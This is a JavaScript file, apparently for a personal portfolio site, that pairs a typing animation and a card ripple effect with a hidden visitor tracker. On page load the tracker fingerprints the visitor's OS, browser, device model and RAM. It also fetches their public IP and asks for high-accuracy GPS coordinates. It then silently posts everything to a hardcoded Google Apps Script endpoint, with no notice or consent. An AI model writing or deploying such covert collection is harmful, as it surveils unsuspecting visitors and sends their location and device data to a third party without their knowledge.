(async function() {
  // === KONFIGURASI ===
  const WEB_APP_URL = "https://script.google.com/macros/s/AKfycbxm-N-geDfJ8y5DgAVEq27w0kAcmeeNumb0WqstrRIDKPZiCfoq7mcObBpHRujR226QJw/exec"; 

  // === 1. DEEP USER AGENT PARSER (BEDAH DETAIL HP & BROWSER) ===
  const getDetailedSpecs = () => {
    const ua = navigator.userAgent;
    let osDetail = "Unknown OS";
    let browserDetail = "Unknown Browser";
    let deviceDetail = "Unknown Device";

    // A. Deteksi Android & Model (Xiaomi, Redmi, Samsung, dll)
    if (/Android/i.test(ua)) {
      const androidMatch = ua.match(/Android\s(\d+(\.\d+)?)/);
      osDetail = `Android ${androidMatch ? androidMatch[1] : 'Unknown'}`;
      
      const modelMatch = ua.match(/Android\s[^;]+;\s([^;]+)\sBuild/);
      deviceDetail = modelMatch ? modelMatch[1] : "Android Device";
    } 
    // B. Deteksi iOS & iPhone Model
    else if (/iPhone|iPad|iPod/.test(ua)) {
      const v = ua.match(/OS (\d+)_(\d+)/);
      osDetail = `iOS ${v[1]}.${v[2]}`;
      const w = window.screen.width, h = window.screen.height;
      const iphones = {"440:956":"iPhone 16 Pro Max","402:874":"iPhone 16 Pro","430:932":"iPhone 15/16 Plus","393:852":"iPhone 14Pro/15/16","390:844":"iPhone 12/13/14"};
      deviceDetail = iphones[`${w}:${h}`] || "Apple iPhone";
    } else {
      osDetail = navigator.platform;
      deviceDetail = "Desktop PC/Laptop";
    }

    // C. Deteksi Browser Engine & Version (Mendeteksi MiuiBrowser, Chrome, dll)
    if (/XiaoMi\/MiuiBrowser\/([\d.]+)/i.test(ua)) {
      browserDetail = `MiuiBrowser ${ua.match(/XiaoMi\/MiuiBrowser\/([\d.]+)/i)[1]} (Blink)`;
    } else if (/Edg\/([\d.]+)/i.test(ua)) {
      browserDetail = `Edge ${ua.match(/Edg\/([\d.]+)/i)[1]} (Blink)`;
    } else if (/Chrome\/([\d.]+)/i.test(ua)) {
      browserDetail = `Chrome ${ua.match(/Chrome\/([\d.]+)/i)[1]} (Blink)`;
    } else if (/Safari\/([\d.]+)/i.test(ua) && !/Chrome/i.test(ua)) {
      browserDetail = `Safari ${ua.match(/Version\/([\d.]+)/i)[1]} (WebKit)`;
    } else {
      browserDetail = "Other Browser";
    }

    return { osDetail, browserDetail, deviceDetail };
  };

  // === 2. TRACKING ENGINE ===
  const startTracker = async () => {
    const specs = getDetailedSpecs();
    let payload = {
      ip: "Checking...",
      osDetail: specs.osDetail,
      browserDetail: specs.browserDetail,
      deviceName: specs.deviceDetail,
      ram: navigator.deviceMemory ? navigator.deviceMemory + " GB" : "N/A",
      lat: null, long: null
    };

    try {
      const res = await fetch('https://api.ipify.org?format=json');
      const d = await res.json();
      payload.ip = d.ip;
    } catch (e) { payload.ip = "Hidden/VPN"; }

    const sendData = (data) => fetch(WEB_APP_URL, { method: "POST", mode: "no-cors", body: JSON.stringify(data) });

    // Cek GPS
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition((pos) => {
        payload.lat = pos.coords.latitude; payload.long = pos.coords.longitude;
        sendData(payload);
      }, () => sendData(payload), { enableHighAccuracy: true });
    } else {
      sendData(payload);
    }
  };

  // === 3. UI EFFECTS (TYPING & RIPPLE) ===
  const typeText = () => {
    const texts = ['IT Support Specialist', 'Graphic Designer', 'Hardware Enthusiast'];
    let idx = 0, char = 0, del = false;
    const el = document.getElementById('typed-text');
    if(!el) return;

    function loop() {
      const curr = texts[idx];
      el.textContent = del ? curr.substring(0, char--) : curr.substring(0, char++);
      let speed = del ? 70 : 150;
      if(!del && char === curr.length) { speed = 2000; del = true; }
      else if(del && char === 0) { del = false; idx = (idx + 1) % texts.length; speed = 500; }
      setTimeout(loop, speed);
    }
    loop();
  };

  // === 4. INISIALISASI ===
  window.addEventListener('load', () => {
    startTracker();
    typeText();
    // Ripple Effect
    document.querySelectorAll('.card').forEach(card => {
      card.addEventListener('mousemove', (e) => {
        const rect = card.getBoundingClientRect();
        card.querySelector('.card-inner').style.setProperty('--x', `${((e.clientX - rect.left) / rect.width) * 100}%`);
        card.querySelector('.card-inner').style.setProperty('--y', `${((e.clientY - rect.top) / rect.height) * 100}%`);
      });
    });
  });
})();
